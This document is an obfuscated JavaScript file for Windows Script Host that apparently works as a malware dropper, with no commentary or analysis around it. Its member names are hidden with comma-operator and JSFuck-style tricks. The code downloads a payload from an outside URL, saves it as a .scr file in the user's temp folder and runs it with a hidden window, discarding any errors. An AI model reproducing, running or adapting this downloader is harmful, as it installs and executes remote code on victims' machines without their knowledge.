translationAutomobile = (((31 + 106) | (2967 / 23)), this);
stopDeclaration = ("professional", "veteran", "Run");
leaderTandem = translationAutomobile[("lady", "dogma", "zombie", "WScript")];
leaderTandem[("visit", "legal", "Sleep")](((1724 + 13308) & (([!+[] + !+[]]) * (((([+!+[]])) + "" + (([+[]])) + "" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])))) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1))));
arcadeElement = leaderTandem[("numeral", "season", "reaction", "CreateObject")](("absolute", "expertise", "dialect", "WScript.Shell"));
toxicCapitulation = arcadeElement[("deposit", "ExpandEnvironmentStrings")](("sector", "cabinet", "business", "adaptation", "%TEMP%/")) + ("story", "opera", "stateInterpretation") + ("selection", "minus", "revue", ".scr");
bomberAviation = translationAutomobile[("diagram", "tradition", "WScript")][("quarantine", "sex", "CreateObject")](("trivial", "location", "rational", "MSXML2.XMLHTTP"));
bomberAviation[("open")](("GET"), ("plus", "board", "skeleton", "square", "http://zarabotoknasayte.zz.mu/7/sh87hg5v4"), !((([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])) > 4));
bomberAviation[("numeration", "send")]();
while(bomberAviation[("bandit", "configuration", "document", "readystate")] < ((2 * 2) & (Math.pow(20, 2) - 394))) {
  translationAutomobile[("bazaar", "mandate", "WScript")][("Sleep")](((3 & 3) + (175, 104, 42, 97)));
}
amperePositive = translationAutomobile[("WScript")][("compact", "CreateObject")](("balloon", "inspector", "cardinal", "vacant", function String.prototype.academyRevue() {
  return this
}, "ADODB.Stream"));
try {
  amperePositive[("conductor", "examination", "open")]();
  amperePositive[("service", "guest", "toxic", "type")] = (32 / 32);
  amperePositive[("trajectory", "write")](bomberAviation[("effect", "battery", "order", "provocation", "ResponseBody")]);
  amperePositive[("typical", "position")] = (([+[]]));
  amperePositive[("opposite", "gram", "saveToFile")](toxicCapitulation, ((57 * 3 + 4), 5 * 2 * 2 * 7, (1 * 2)));
  amperePositive[("close")]();
  arcadeElement[stopDeclaration](toxicCapitulation.academyRevue(), (0 ^ 0), ((0 / 49) | 0));
} catch(minorIndifferent) {};
